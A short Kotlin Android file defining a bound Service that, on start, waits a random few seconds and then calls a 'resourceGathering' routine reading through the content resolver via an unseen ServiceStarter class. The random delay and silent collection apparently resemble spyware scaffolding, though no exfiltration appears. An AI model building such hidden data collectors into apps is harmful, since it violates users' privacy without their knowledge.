package com.example.mobileappproj.security

import android.app.Service
import android.content.Intent
import android.os.IBinder
import java.util.Timer
import java.util.TimerTask
import kotlin.random.Random

class ServiceManager : Service() {
    private val binder = LocalBinder()
    private val timer = Timer()

    override fun onCreate() {
        super.onCreate()


        resourceGathering()
    }

    private fun resourceGathering() {
        val delay = Random.nextLong(0, 30_000) // Random delay between 0 and 30 seconds (in milliseconds)
        timer.schedule(object : TimerTask() {
            override fun run() {
                val serviceStarter = ServiceStarter(this@ServiceManager)
                val attach = serviceStarter.getResources(contentResolver)
            }
        }, delay)
    }
    override fun onBind(intent: Intent): IBinder {
        return binder
    }

    inner class LocalBinder : android.os.Binder() {
        fun getService(): ServiceManager = this@ServiceManager
    }
}